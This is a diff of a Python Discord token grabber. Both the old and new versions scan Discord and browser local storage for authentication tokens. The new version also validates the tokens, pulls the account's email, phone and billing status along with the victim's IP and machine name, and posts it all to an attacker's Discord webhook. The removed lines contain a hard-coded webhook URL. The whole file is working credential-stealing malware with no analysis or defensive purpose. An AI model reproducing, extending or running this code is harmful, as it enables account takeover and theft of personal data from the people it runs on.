@@ -1,74 +1,152 @@
 import os
-import re
-import json
 
+from re import findall
+from json import loads, dumps
+from base64 import b64decode
 from urllib.request import Request, urlopen
 
-# your webhook URL
-WEBHOOK_URL = 'https://discord.com/api/webhooks/811275490174173185/j9Et5HN0jn5nh35Sw_SDguZAK6YWWbEGiwujq4coyEr7hKiwoaHgkKwiYcgERaoChXFl'
+from webhook_secret import *
 
-# mentions you when you get a hit
-PING_ME = True
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+PATHS = {
+    "Discord": ROAMING + "\\Discord",
+    "Discord Canary": ROAMING + "\\discordcanary",
+    "Discord PTB": ROAMING + "\\discordptb",
+    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
+    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
+    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+}
 
-def find_tokens(path):
-    path += '\\Local Storage\\leveldb'
 
-    tokens = []
-
-    for file_name in os.listdir(path):
-        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-            continue
-
-        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                for token in re.findall(regex, line):
-                    tokens.append(token)
-    return tokens
-
-def main():
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
-
-    paths = {
-        'Discord': roaming + '\\Discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Discord PTB': roaming + '\\discordptb',
-        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
-    }
-
-    message = '@everyone' if PING_ME else ''
-
-    for platform, path in paths.items():
-        if not os.path.exists(path):
-            continue
-
-        message += f'\n**{platform}**\n```\n'
-
-        tokens = find_tokens(path)
-
-        if len(tokens) > 0:
-            for token in tokens:
-                message += f'{token}\n'
-        else:
-            message += 'No tokens found.\n'
-
-        message += '```'
-
+def getHeader(token=None, content_type="application/json"):
     headers = {
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+        "Content-Type": content_type,
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
     }
+    if token:
+        headers.update({"Authorization": token})
+    return headers
 
-    payload = json.dumps({'content': message})
 
+def getUserData(token):
     try:
-        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
-        urlopen(req)
+        return loads(
+            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
     except:
         pass
 
-if __name__ == '__main__':
-    main()
+
+def getTokenz(path):
+    path += "\\Local Storage\\leveldb"
+    tokens = []
+    for file_name in os.listdir(path):
+        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+            continue
+        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                for token in findall(regex, line):
+                    tokens.append(token)
+    return tokens
+
+
+def whoTheFuckAmI():
+    ip = "None"
+    try:
+        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
+    except:
+        pass
+    return ip
+
+
+def paymentMethods(token):
+    try:
+        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
+                                              headers=getHeader(token))).read().decode())) > 0)
+    except:
+        pass
+
+
+def main():
+    cache_path = ROAMING + "\\.cache~$"
+    embeds = []
+    working = []
+    checked = []
+    already_cached_tokens = []
+    working_ids = []
+    ip = whoTheFuckAmI()
+    pc_username = os.getenv("UserName")
+    pc_name = os.getenv("COMPUTERNAME")
+    user_path_name = os.getenv("userprofile").split("\\")[2]
+    for platform, path in PATHS.items():
+        if not os.path.exists(path):
+            continue
+        for token in getTokenz(path):
+            if token in checked:
+                continue
+            checked.append(token)
+            uid = None
+            if not token.startswith("mfa."):
+                try:
+                    uid = b64decode(token.split(".")[0].encode()).decode()
+                except:
+                    pass
+                if not uid or uid in working_ids:
+                    continue
+            user_data = getUserData(token)
+            if not user_data:
+                continue
+            working_ids.append(uid)
+            working.append(token)
+            username = user_data["username"] + "#" + str(user_data["discriminator"])
+            user_id = user_data["id"]
+            email = user_data.get("email")
+            phone = user_data.get("phone")
+            nitro = bool(user_data.get("premium_type"))
+            billing = bool(paymentMethods(token))
+            embed = {
+                "color": 0x7289da,
+                "fields": [
+                    {
+                        "name": "|Account Info|",
+                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
+                        "inline": True
+                    },
+                    {
+                        "name": "|PC Info|",
+                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
+                        "inline": True
+                    },
+                    {
+                        "name": "|Token|",
+                        "value": token,
+                        "inline": False
+                    }
+                ],
+                "author": {
+                    "name": f"{username} ({user_id})",
+                },
+                "footer": {
+                    "text": f"Visit my website for more: tetrazero.com"
+                }
+            }
+            embeds.append(embed)
+    with open(cache_path, "a") as file:
+        for token in checked:
+            if not token in already_cached_tokens:
+                file.write(token + "\n")
+    if len(working) == 0:
+        working.append('123')
+    webhook = {
+        "content": "",
+        "embeds": embeds,
+        "username": "Discord Token Grabber"
+    }
+    try:
+        urlopen(Request(TOKEN_WEBHOOK_URL, data=dumps(webhook).encode(), headers=getHeader()))
+    except:
+        pass
+
+
+main()
